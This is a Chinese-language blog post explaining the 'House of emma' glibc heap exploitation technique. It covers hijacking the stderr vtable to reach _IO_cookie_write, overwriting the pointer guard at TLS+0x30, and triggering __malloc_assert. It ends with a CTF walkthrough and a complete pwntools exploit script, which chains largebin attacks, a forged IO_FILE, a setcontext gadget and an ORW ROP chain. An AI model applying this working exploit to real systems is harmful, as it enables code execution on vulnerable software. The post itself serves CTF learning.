---
title: House of emma
date: '2025-08-13 11:54:42'
updated: '2025-08-13 11:59:23'
permalink: posts/16122.html
categories:
  - 知识分享
tags:
  - House of 系列手法
---

# House of emma

在 `GLibc2.34` 版本中，我们以往堆利用最常用的两个 `Hook` ：`malloc_hook` 、`free_hook` 直接被取消，导致以往的大部分堆利用手法直接失效，这时候我们急需发现一个类似于 `__free_hook` 这样的函数指针调用，从而来削弱 `getshell` 的限制条件。

`House of emma` 因此诞生

## 利用范围：

- `2.23`—— 至今

## 利用条件：

- 需要两次任意地址写已知地址
- 需要泄露libc地址以及堆块地址
- 能够触发IO流（House of kiwi 、FSOP）

由于在 `glibc-2.24` 的时候添加了对 `vtable` 的合法性检查，所以我们不能像以往一样直接对 `vtable` 进行一个劫持，但是这个检查对具体位置相对宽松，我们还是可以在一定范围之内对 `vtable` 起始位置进行一个偏移 ，我们就可以通过偏移来调用在 `vtable` 表中的任意函数，因此我们可以考虑将其指定为以下几个函数。

```
static ssize_t
_IO_cookie_read (FILE *fp, void *buf, ssize_t size)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_read_function_t *read_cb = cfile->__io_functions.read;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (read_cb);
#endif
 
  if (read_cb == NULL)
    return -1;
 
  return read_cb (cfile->__cookie, buf, size);
}
 
static ssize_t
_IO_cookie_write (FILE *fp, const void *buf, ssize_t size)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_write_function_t *write_cb = cfile->__io_functions.write;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (write_cb);
#endif
 
  if (write_cb == NULL)
    {
      fp->_flags |= _IO_ERR_SEEN;
      return 0;
    }
 
  ssize_t n = write_cb (cfile->__cookie, buf, size);
  if (n < size)
    fp->_flags |= _IO_ERR_SEEN;
 
  return n;
}
 
static off64_t
_IO_cookie_seek (FILE *fp, off64_t offset, int dir)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_seek_function_t *seek_cb = cfile->__io_functions.seek;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (seek_cb);
#endif
 
  return ((seek_cb == NULL
       || (seek_cb (cfile->__cookie, &offset, dir)
           == -1)
       || offset == (off64_t) -1)
      ? _IO_pos_BAD : offset);
}
 
static int
_IO_cookie_close (FILE *fp)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_close_function_t *close_cb = cfile->__io_functions.close;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (close_cb);
#endif
 
  if (close_cb == NULL)
    return 0;
 
  return close_cb (cfile->__cookie);
```

这几个函数存在任意函数指针的调用，且函数指针来源于 `_IO_cookie_file` 结构体，这个结构体是 `_IO_FILE_plus` 的扩展，如果我们可以控制 `IO` 的内容，大概率这部分数据也是可控的 ，并且其第一个参数也是来源于这个结构，所以我们可以把它当作类似于 `__free_hook` 的 `Hook` 来利用 。

### 绕过 PTR_DEMANGLE

<img src="/images/posts/20250813115633036.png" alt="image-20250813103454655" style="zoom: 50%;" />

由于`_IO_cookie_write` 等函数的调用涉及到指针加密 ：**ROR 移位 0x11 后再与指针进行异或**

```
extern uintptr_t __pointer_chk_guard attribute_relro;
#  define PTR_MANGLE(var) \
  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)
#  define PTR_DEMANGLE(var) PTR_MANGLE (var)
```

其指针加密的 `key` 值存在于 `TLS + 0x30` 处 ，要想调用目标函数，我们就必须要对放置的目标函数进行一个解加密，但是由于 `key` 值是完全随机的，所以常规来讲我们是不可能直接破解这个加密方式的，但是由于 `key` 值处可写 ，我们可以利用其他手法，如 `largebin attack` 、`tcache stash unlinking` 等 ，向 `TLS + 0x30` 的位置写入一个已知地址 ，把原本随机的 `key` 值覆盖成我们已知的地址，这样一来，我们就可以对这个安全保护进行一个绕过了 （实际攻击的时候，远程的 `TLS` 位置可能会有一些偏移，需要爆破）

```
# 加密函数 循环左移
def rotate_left_64(x, n):
    # 确保移动的位数在0-63之间
    n = n % 64
    # 先左移n位
    left_shift = (x << n) & 0xffffffffffffffff
    # 然后右移64-n位，将左移时超出的位移动回来
    right_shift = (x >> (64 - n)) & 0xffffffffffffffff
    # 合并两部分
    return left_shift | right_shift
```

这里我贴一个解密脚本，是在覆盖 `key` 为已知地址的情况下实现的 。

### 整体的利用思路分为三大步

- 劫持 `stderr` 到堆块上，同时伪造好 `IO` 结构 ，改写 `stderr` 的 `vtable` 为 `_IO_cookie_jumps + 0x40` ，使其调用  `_IO_cookie_wirte`  。
- 覆盖 `TLS + 0x30` 处的 `key` 值为已知地址 。
- 布置好 `IO` 结构后 ，触发 `__malloc_assert` （参考 `House of kiwi`）。

### 攻击过程中可能会遇到的问题：

- 可能会出现 `stderr` 指针在 `bss` 段，而不是 `libc` 的情况，这种情况就不能使用上面的常规打法 ，如果我们无法直接纂改，就只能考虑打 `FSOP` 的方式 ，但是 `exit` 调用也涉及到指针保护，此时的 `key` 值已经被我们修改 ，使其无法执行正确的函数地址 。

以上情况的解决方法是，构造两个 `IO_FILE` 结构 ，后者位于前者的 `_chain` 处，这里我们可以考虑 `House of apple1` + `House of emma` 的打法 ，使用 `House of apple1` 来修改 `TLS + 0x30` 的 `key` 值为已知地址，然后使用 `House of emma` 执行调用函数 。

当然如果有这种条件那我们应该可以直接打 `House of apple2` 了 。

- `glibc-2.36` 之后 `__malloc_assert` 被修改成：

```
_Noreturn static void
__malloc_assert (const char *assertion, const char *file, unsigned int line,
		 const char *function)
{
  __libc_message (do_abort, "\
Fatal glibc error: malloc assertion failure in %s: %s\n",
		  function, assertion);
  __builtin_unreachable ();
}
```

移除了 `fxprint` 函数

### 调用过程及可控寄存器：

```
__malloc_assert => __fxprintf => __vfxprintf => locked_vfxprintf => __vfprintf_internal => _IO_cookie_write
```

![image-20250813105451118](/images/posts/20250813115628911.png)

`rax` 是我们可以直接控制的，最后 `_IO_cookie_write` 也是 `call rax` , 实现任意函数调用 ，其中 `rdi` 是我们可以控制的 ，`rbp` 指向的是我们伪造的 `IO_FILE` 结构体 ，如果程序没有开启沙箱限制，我们就可以直接执行 `system("/bin/sh");` 来拿到 `shell` ，但是如果程序开启了沙箱限制，这里就需要考虑两种情况，一种是 `glibc-2.29` 之前 ，`setcontext + xx` 是通过 `rdi` 来控制寄存器的，我们就可以直接 `call setcontext + xx` 然后布局好 `rop` ，打 `orw` 即可 ，但是如果是 `glibc-2.29` 之后， 那么我们就只能通过一些 `magic_gadget` 来实现一些寄存器的转化，最好找一个能够通过 `rdi` 来给`rdx` 赋值的寄存器，因为 `rdi` 是可控的 ，然后还需要一个 `call` 的调用，使得攻击得以持续 。

![image-20250813110343788](/images/posts/20250813115631459.png)

这里恰好有这么一条寄存器可以做到上述攻击方式 。

## 例题演示：[湖湘杯 2021]house_of_emma 

**常规检查：**

![image-20250813110612728](/images/posts/20250813115641727.png)

64位 保护全开

![image-20250813111332705](/images/posts/20250813115639799.png)

禁用了 `execve` 调用 。

IDA：

main（）：

![image-20250813110553204](/images/posts/20250813115637866.png)

看到 `vm` 调用就可以猜出来大概是一个 `vmpwn` 题 

![image-20250813110758383](/images/posts/20250813115647694.png)

程序的逻辑不难理解，还非常好处理，这里我就不一一展示每一个函数的内容了，我只大致说一下：

- `calloc_add` 函数可以利用 `calloc` 创造  `0x40F < size < 0x500` 大小的堆块 。
- `delete` 函数 `free` 后没有清空堆块指针，存在明显的 `uaf` 漏洞 。
- `show` 和 `edit` 查看与修改堆块内容，没有什么问题 。

这里直接延用我上面讲过的打法就行，劫持 `stderr` 到堆块上，布置好 `IO` 结构，使其调用 `_IO_cookie_write` ，`call rax` 处我们不能直接调用 `system('/bin/sh')` 因为程序禁用了 `execve` ，这个时候我们考虑打  `orw`  ，由于libc版本在 `glibc-2.35`, 所以我们需要使用以下 `gadget` ，来控制 `rdx` 寄存器，同时记得绕过指针保护 ：

```
0x00000000001675b0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; 
```

最后 `call setcontext + 61` 布局寄存器，执行 `rop` 即可获取到 `flag` 。

### EXP：

```
from pwn import*
from struct import*
from LibcSearcher import*
from ctypes import CDLL
from functools import reduce
from z3 import *
import gmpy2
import binascii

local = 1
if local:
    p = process('./pwn')
else:
    p = remote('',)

elf = ELF('./pwn')
libc = ELF('./libc.so.6')
#libc = CDLL("libc.so.6")
context(arch='amd64',log_level='debug',os='linux')
#context(arch='i386',log_level='debug',os='linux')
#shellcode = asm(shellcraft.sh())

def ELF(func_name):
    globals()[f"{func_name}_got"] = elf.got[func_name]
    globals()[f"{func_name}_plt"] = elf.plt[func_name]

def GDB(script=""):
    gdb.attach(p, gdbscript=script)

def fmt64():
    p.recvuntil("0x")
    return int(p.recv(12),16)

def fmt32():
    p.recvuntil("0x")
    return int(p.recv(8),16)

def ph(var):
    var_name = [name for name, value in globals().items() if value is var][0]
    log.info(f"{var_name}  >> {hex(var)}")

def phlen(var):
    var_name = [name for name, value in globals().items() if value is var][0]
    log.info(f"{var_name}(DEC)  >> {len(var)}")
    log.info(f"{var_name}(HEX)  >> {hex(len(var))}")

def ELFlibc(real_addr, func_name):
    global libc_base, system, binsh 
    libc_base = real_addr - libc.symbols[func_name]
    system = libc_base + libc.symbols['system']
    binsh = libc_base + next(libc.search(b'/bin/sh'))
    success(f"libc_base  >> {hex(libc_base)}")

def Libcer(real_addr, func_name):
    global libc_base, system, binsh 
    libc = LibcSearcher(func_name,real_addr)
    libc_base = real_addr - libc.dump(func_name)
    system = libc_base + libc.dump('system')
    binsh = libc_base + libc.dump('str_bin_sh')
    success(f"libc_base  >> {hex(libc_base)}")

opcode = b''

def add(index,size):
    global opcode
    payload = p8(1) + p8(index) + p16(size) 
    opcode += payload 

def free(index):
    global opcode
    payload = p8(2) + p8(index) 
    opcode += payload
    
def show(index):
    global opcode
    payload = p8(3) + p8(index) 
    opcode += payload

def edit(index,msg):
    global opcode
    payload = b'\x04' + p8(index) + p16(len(msg)) + msg 
    opcode += payload

def run():
    global opcode
    opcode += p8(5)
    sa("Pls input the opcode\n",opcode)
    opcode = b''
    
def rotate_left_64(x, n):
    # 确保移动的位数在0-63之间
    n = n % 64
    # 先左移n位
    left_shift = (x << n) & 0xffffffffffffffff
    # 然后右移64-n位，将左移时超出的位移动回来
    right_shift = (x >> (64 - n)) & 0xffffffffffffffff
    # 合并两部分
    return left_shift | right_shift

LIBC = lambda func   :libc_base + libc.sym[func]
sd = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
rc   = lambda num=4096   :p.recv(num)
ru   = lambda a,b=False : p.recvuntil(a,drop=b)
rl  = lambda 	:p.recvline()
pr = lambda num=4096 :print(p.recv(num))
l32 = lambda    :u32(p.recvuntil(b'\xf7')[-4:].ljust(4,b'\x00'))
l64 = lambda    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data   :int(data,16)

#------------------------------------------------------------------------------------#

#------------------------------------------------------------------------------------#
#( v3 <= 0x40Fu || v3 > 0x500u || v2 > 0x10u )
add(0,0x410)
add(1,0x420)
add(2,0x410)
add(3,0x410)
free(1)
add(4,0x500)
show(1)
run()
libc_base = l64() - 0x21a0d0
ph(libc_base)
edit(1,b'a'*0x10)
show(1)
run()
ru(b'a'*0x10)
heap_base = uu64() - 0x26c0
ph(heap_base)
stderr = libc_base + libc.sym['stderr']
edit(1,p64(libc_base+0x21a0d0)*2+p64(heap_base+0x26c0)+p64(stderr-0x20))
free(3)
run()
add(5,0x410)
guard = libc_base - 0x2890
edit(1,p64(libc_base+0x21a0d0)*2+p64(heap_base+0x26c0)+p64(guard-0x20))
free(3)
run()
ph(stderr)
ph(guard)
add(6,0x410)
run()
IO_addr = heap_base + 0x26c0
magic = libc_base + 0x00000000001675b0
#IO_cookie_jumps = libc_base + libc.sym['_IO_cookie_jumps']
IO_cookie_jumps = libc_base + 0x215b80
setcontext = libc_base + libc.sym['setcontext']
flag_addr = IO_addr + 0x118 + 8
pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdx_r12 = libc_base + 0x000000000011f497
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
open = libc_base + libc.sym['open']
ret = pop_rdi + 1
rop = flat([pop_rdi,flag_addr,pop_rsi,0,pop_rdx_r12,0,0,open])
rop += flat([pop_rdi,3,pop_rsi,heap_base+0x300,pop_rdx_r12,0x50,0,read])
rop += flat([pop_rdi,1,pop_rsi,heap_base+0x300,pop_rdx_r12,0x50,0,write])
IO = flat(
{
0x28 : 0xffffffffffffffff ,
0x88 : heap_base ,
0xd8 : IO_cookie_jumps + 0x40 ,
0xe0 : IO_addr + 0x110 ,
0xe8 : p64(rotate_left_64(magic^(heap_base+0x26c0),0x11))*3 ,
0x118 : IO_addr + 0x118 ,
0x118 + 8 : b'flag\x00\x00\x00\x00' ,
0x118 + 0x20 : setcontext + 61 ,
0x118 + 0xa0 : IO_addr + 0x200 ,
0x118 + 0xa8 : ret ,
0x200 : rop ,
},
filler = b'\x00'
)
edit(1,p64(libc_base+0x21a0d0)*2+p64(heap_base+0x26c0)*2)
add(7,0x420)
edit(1,IO[0x10:])
add(8,0x500)
free(8)
add(9,0x418)
run()
edit(8,b'a'*0x418+p64(0x300))
run()
GDB("b *__malloc_assert")
#GDB("b *_IO_cookie_write")
#GDB("b *(setcontext+61)")
add(10,0x500)
run()
p.interactive()
```

### 参考链接：

[[原创\]【伽玛】第七届“湖湘杯” House _OF _Emma | 设计思路与解析-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-270429.htm#msg_header_h3_6)

[常回家看看之house_of_emma - CH13hh - 博客园](https://www.cnblogs.com/CH13hh/p/18412165)































































